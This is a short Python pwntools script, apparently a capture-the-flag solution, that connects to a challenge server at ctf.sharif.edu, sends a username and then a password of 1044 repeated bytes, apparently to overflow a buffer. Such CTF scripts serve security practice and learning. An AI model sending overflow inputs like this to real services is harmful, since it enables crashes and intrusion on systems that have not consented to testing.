#!/usr/bin/env python2

from pwn import *
context(os = 'linux', arch = 'amd64')

r = remote('ctf.sharif.edu', 27515)

print r.recv()

r.sendline("Hello") # username
print r.recv()

r.sendline("\x01"*(1044)) # password
print r.recv()
